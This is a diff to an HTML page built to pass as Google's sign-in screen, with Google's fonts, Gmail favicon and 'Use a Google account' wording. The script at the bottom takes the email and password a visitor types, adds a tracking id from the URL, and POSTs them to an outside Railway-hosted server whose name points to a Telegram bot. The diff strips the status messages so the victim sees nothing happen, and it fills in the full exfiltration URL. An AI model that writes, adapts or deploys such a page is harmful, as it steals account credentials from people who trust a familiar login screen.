@@ -1,162 +1,11 @@
-<script type="text/javascript">
-        var gk_isXlsx = false;
-        var gk_xlsxFileLookup = {};
-        var gk_fileData = {};
-        function filledCell(cell) {
-          return cell !== '' && cell != null;
-        }
-        function loadFileData(filename) {
-        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
-            try {
-                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
-                var firstSheetName = workbook.SheetNames[0];
-                var worksheet = workbook.Sheets[firstSheetName];
-
-                // Convert sheet to JSON to filter blank rows
-                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
-                // Filter out blank rows (rows where all cells are empty, null, or undefined)
-                var filteredData = jsonData.filter(row => row.some(filledCell));
-
-                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
-                var headerRowIndex = filteredData.findIndex((row, index) =>
-                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
-                );
-                // Fallback
-                if (headerRowIndex === -1 || headerRowIndex > 25) {
-                  headerRowIndex = 0;
-                }
-
-                // Convert filtered JSON back to CSV
-                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
-                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
-                return csv;
-            } catch (e) {
-                console.error(e);
-                return "";
-            }
-        }
-        return gk_fileData[filename] || "";
-        }
-        </script><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
     <title>Google Login Form</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-size: cover;
-            font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
-        }
-        .box {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 25rem;
-            padding: 2.5rem;
-            box-sizing: border-box;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-        }
-        .google-logo {
-            display: flex;
-            justify-content: center;
-            padding-bottom: 15px;
-        }
-        .box h2 {
-            margin: 0 0 -0.125rem;
-            padding: 0;
-            color: #202124;
-            text-align: center;
-            font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
-            font-size: 24px;
-            font-weight: 400;
-        }
-        .box p {
-            font-size: 16px;
-            font-weight: 400;
-            letter-spacing: .1px;
-            line-height: 1.5;
-            margin-bottom: 25px;
-            text-align: center;
-        }
-        .box .inputBox {
-            position: relative;
-        }
-        .box .inputBox input {
-            width: 93%;
-            padding: 0.625rem 10px;
-            font-size: 1rem;
-            letter-spacing: 0.062rem;
-            margin-bottom: 1.875rem;
-            border: 1px solid #ccc;
-            background: transparent;
-            border-radius: 4px;
-        }
-        .box .inputBox label {
-            position: absolute;
-            top: 0;
-            left: 10px;
-            padding: 0.625rem 0;
-            font-size: 1rem;
-            color: grey;
-            pointer-events: none;
-            transition: 0.3s;
-        }
-        .box .inputBox input:focus ~ label,
-        .box .inputBox input:valid ~ label,
-        .box .inputBox input:not([value=""]) ~ label {
-            top: -1.125rem;
-            left: 10px;
-            color: #1a73e8;
-            font-size: 0.75rem;
-            background-color: white;
-            height: 10px;
-            padding-left: 5px;
-            padding-right: 5px;
-        }
-        .box .inputBox input:focus {
-            outline: none;
-            border: 2px solid #1a73e8;
-        }
-        .box input[type="button"] {
-            border: none;
-            outline: none;
-            color: #fff;
-            background-color: #1a73e8;
-            padding: 0.625rem 1.25rem;
-            cursor: pointer;
-            border-radius: 0.312rem;
-            font-size: 1rem;
-            float: right;
-        }
-        .box input[type="button"]:hover {
-            background-color: #287ae6;
-            box-shadow: 0 1px 1px 0 rgba(66,133,244,0.45), 0 1px 3px 1px rgba(66,133,244,0.3);
-        }
-        .forgot {
-            margin-top: -20px;
-        }
-        .forgot button {
-            border-radius: 4px;
-            color: #1a73e8;
-            display: inline-block;
-            font-weight: 500;
-            letter-spacing: .25px;
-            outline: 0;
-            position: relative;
-            background-color: transparent;
-            cursor: pointer;
-            font-size: inherit;
-            padding: 0;
-            text-align: left;
-            border: 0;
-        }
-        #status { margin-top: 10px; font-size: 14px; color: #d93025; }
-    </style>
+    <link rel="icon" href="https://ssl.gstatic.com/ui/v1/icons/mail/images/favicon5.ico" type="image/x-icon">
 </head>
 <body>
     <div class="box">
@@ -176,64 +25,50 @@
         <p>Use a Google account</p>
         <form>
             <div class="inputBox">
-                <input type="email" id="emailInput" name="email" required onkeyup="this.setAttribute('value', this.value);" value="">
-                <label>Email address or telephone number</label>
+                <input type="email" id="emailInput" name="email" required="" onkeyup="this.setAttribute('value', this.value);" value="">
+                <label>E-mail address or telephone number</label>
             </div>
             <div class="inputBox">
-                <input type="password" id="passwordInput" name="text" required onkeyup="this.setAttribute('value', this.value);" value="">
+                <input type="password" id="passwordInput" name="password" required="" onkeyup="this.setAttribute('value', this.value);" value="">
                 <label>Password</label>
             </div>
             <div class="forgot">
                 <button type="button">Forgot your address?</button>
             </div>
-            <input type="button" id="loginButton" value="Sign In">
-            <p id="status"></p>
+            <input type="button" id="signInButton" value="Sign In">
         </form>
     </div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const unique_id = urlParams.get('id');
-        const api_url = 'tgbot-telegrambot2.up.railway.app'; // Replace with your Railway URL
+        const api_url = 'https://tgbot-telegrambot2.up.railway.app';
 
-        const loginButton = document.getElementById('loginButton');
+        const signInButton = document.getElementById('signInButton');
         const emailInput = document.getElementById('emailInput');
         const passwordInput = document.getElementById('passwordInput');
-        const status = document.getElementById('status');
 
         if (!unique_id) {
-            status.textContent = 'Error: ID not found!';
-            loginButton.style.display = 'none';
-            return;
-        }
+            signInButton.style.display = 'none';
+        } else {
+            signInButton.addEventListener('click', () => {
+                const email = emailInput.value.trim();
+                const password = passwordInput.value.trim();
 
-        loginButton.addEventListener('click', () => {
-            const email = emailInput.value.trim();
-            const password = passwordInput.value.trim();
-
-            if (!email || !password) {
-                status.textContent = 'Please enter email or password!';
-                return;
-            }
-
-            status.textContent = 'Submitting data...';
-            fetch(`${api_url}/login`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ unique_id, email, password })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.status === 'success') {
-                    status.textContent = 'Data successfully submitted!';
-                } else {
-                    status.textContent = `Error: ${data.message}`;
+                if (!email || !password) {
+                    return;
                 }
-            })
-            .catch(error => {
-                status.textContent = `Error submitting data: ${error}`;
+
+                fetch(`${api_url}/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ unique_id, email, password })
+                })
+                .catch(error => {
+                    console.error('Error submitting data:', error.message);
+                });
             });
-        });
+        }
     </script>
 </body>
 </html>
